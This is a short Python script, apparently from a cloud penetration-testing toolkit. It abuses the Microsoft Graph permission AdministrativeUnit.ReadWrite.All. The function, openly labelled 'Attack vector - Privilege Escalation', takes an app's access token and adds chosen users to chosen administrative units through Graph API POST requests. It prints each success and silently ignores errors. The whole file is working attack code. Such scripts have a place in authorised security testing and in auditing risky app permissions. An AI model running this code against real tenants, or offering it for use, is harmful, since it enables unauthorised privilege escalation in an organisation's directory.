import requests
import colorama
from colorama import Fore, Style


def AU_Vectors(request_headers, AUSettings):
    print()
    print(
        "AdministrativeUnit.ReadWrite.All  - Allows the app to create, read, update, and delete administrative units "
        "and manage administrative unit membership without a signed-in user.")
    print()
    try:
        print("Attack vector - Privilege Escalation.")
        for au in AUSettings["AU"]:
            create_message_URL = "https://graph.microsoft.com/v1.0/directory/administrativeUnits/" + au + "/members/$ref"
            for user in AUSettings["users"]:
                message_obj = {
                    "@odata.id": "https://graph.microsoft.com/beta/directoryObjects/" + user
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
                if result.status_code == 204:
                    print(Fore.GREEN + "" + user + " added to administrative unit- " + au)
                    print(Style.RESET_ALL)

    except:
        pass
